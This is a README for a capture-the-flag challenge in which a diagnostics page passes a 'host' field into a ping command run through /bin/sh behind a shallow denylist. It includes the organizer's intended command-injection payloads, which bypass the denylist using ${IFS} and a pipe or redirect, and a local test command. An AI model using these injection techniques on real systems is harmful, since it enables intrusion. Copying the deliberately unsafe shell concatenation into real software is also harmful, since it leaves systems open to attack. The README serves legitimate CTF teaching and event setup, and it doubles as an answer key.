# 23 — Desert Diagnostics (deployable)

A command-injection challenge. Each team gets its own diagnostics page.

- **Type:** `dynamic_docker` (ctfd-whale), HTTP redirect, port 80.
- **Flag:** injected by whale as the `FLAG` env var; written to `/flag.txt`
  inside the container at start-up. It is not served by any route.
- **Vulnerability:** the `host` field is concatenated into
  `ping -c 1 -W 1 <host>` and run through `/bin/sh`. A shallow denylist blocks
  whitespace and `;`/`&`, so the bypass has to rebuild a space and chain another
  way. Combined stdout+stderr is returned, so a chained command's output shows
  even though `ping` itself has no raw-socket permission in the container.
- **Intended solve (organizer note):**
  ```
  /?host=127.0.0.1|cat${IFS}/flag.txt
  ```
  `${IFS}` expands to whitespace, and the pipe chains `cat`. Equivalent:
  `127.0.0.1|cat</flag.txt` (redirect instead of an argument).

> Security note: this challenge gives players shell command execution. On the
> shared `challenges` overlay network, containers can reach one another. For the
> event, run code-execution challenges with whale's **grouped containers** so
> each instance gets its own network (see
> [`../../plugins/ctfd-whale/docs/install.md`](../../plugins/ctfd-whale/docs/install.md)).
> The flag is still per-team and random, so a shell in one instance does not
> reveal another team's flag.

## Local test

```sh
docker build -t taibah-ctf/23-desert-diagnostics:latest .
docker run --rm -p 8023:80 -e FLAG='TAIBAH{test}' taibah-ctf/23-desert-diagnostics:latest
curl -s 'http://localhost:8023/?host=127.0.0.1|cat${IFS}/flag.txt'
```
